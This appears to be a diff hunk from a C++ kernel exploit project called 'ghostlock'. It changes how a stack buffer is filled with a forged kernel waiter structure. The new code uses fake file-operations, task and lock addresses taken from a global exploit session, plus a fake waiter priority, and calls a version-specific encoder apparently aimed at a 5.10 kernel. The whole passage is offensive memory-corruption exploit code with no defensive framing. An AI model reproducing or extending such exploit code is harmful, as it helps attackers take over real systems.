@@ -37,11 +37,21 @@ namespace ghostlock::route {
      * rejects an undersized buffer before any indexed write. */
     __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
         memset(stamp, 0, sizeof(stamp));
-        if (!memory::encode_multicast_waiter(
+        const memory::WriteRequest route_request = request
+                ? *request
+                : memory::WriteRequest::make(0, memory::WriteMode::Disabled, true);
+        const memory::PayloadWriteLayout route_layout = memory::payload_write_layout(
+            &route_request,
+            session::g_exploit_session.heap.current.base,
+            session::g_exploit_session.heap.current.fake_fops,
+            session::g_exploit_session.heap.current.fake_fops,
+            session::g_exploit_session.heap.current.fake_right);
+        if (!memory::encode_multicast_waiter_5_10(
             {reinterpret_cast<std::byte *>(stamp), stamp_size},
             static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
-            *layout.lock_offset,
-            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
+            *layout.lock_offset, route_request, route_layout,
+            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock),
+            kernel::FAKE_WAITER_PRIO)) {
             status.step = 59;
             status.error_number = EOVERFLOW;
             status.userspace_clean = 1;
